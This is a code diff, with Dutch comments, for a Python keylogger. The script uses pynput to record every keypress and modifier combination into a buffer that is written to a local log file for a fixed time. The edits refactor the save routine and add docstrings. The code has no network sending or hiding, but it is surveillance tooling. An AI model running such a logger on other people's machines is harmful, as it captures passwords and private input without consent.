@@ -28,17 +28,17 @@ start = time.time()
 
 def save(log_file_name: str = "log.txt") -> str:
     """ Schrijft de buffer naar een logfile """
-    try:
-        if buffer:
-            with open(log_file_name, "a") as file:
-                file.write(buffer)
-            buffer.clear()
-            return f"bestand opgeslagen als: {log_file_name}"
-    except Exception as e:
-        return f"Er ging iets mis: {e}"
+    buffer_str = ""
+    if buffer:
+        for letter in buffer:
+            buffer_str += letter
+        with open(log_file_name, "a") as file:
+            file.write(buffer_str)
+        buffer.clear()
 
 
 def on_keypress(toets):
+    """Event handler voor keypress"""
     try:
         toets_str = str(toets).replace("'", "")
         if toets_str in MOD_KEYS:
@@ -50,6 +50,7 @@ def on_keypress(toets):
 
 
 def on_release(toets):
+    """Event handler voor release"""
     try:
         mods.discard(str(toets).replace("'", ""))
         if time.time() - start < MAX_TIJD:
@@ -60,10 +61,12 @@ def on_release(toets):
 
 
 def log_input(toets):
+    """Maakt onderscheid tussen mod, special en normal char en voegt deze toe aan buffer"""
     try:
-        t = SPECIALE_KEYS.get(str(toets[1:-1]))
+        t = SPECIALE_KEYS.get(str(toets).replace(
+            "'", ""), str(toets).replace("'", ""))
         if mods:
-            t = "+".join(sorted(mods)) + f"+{t}"
+            t = "\n+".join(sorted(mods)) + f"+{t}"
         buffer.append(t)
         if len(buffer) >= BUF_GROOTTE:
             save()
@@ -72,6 +75,7 @@ def log_input(toets):
 
 
 def start_logger():
+    """Main functie voor logger"""
     with keyboard.Listener(on_press=on_keypress, on_release=on_release):
         try:
             while time.time() - start < MAX_TIJD:
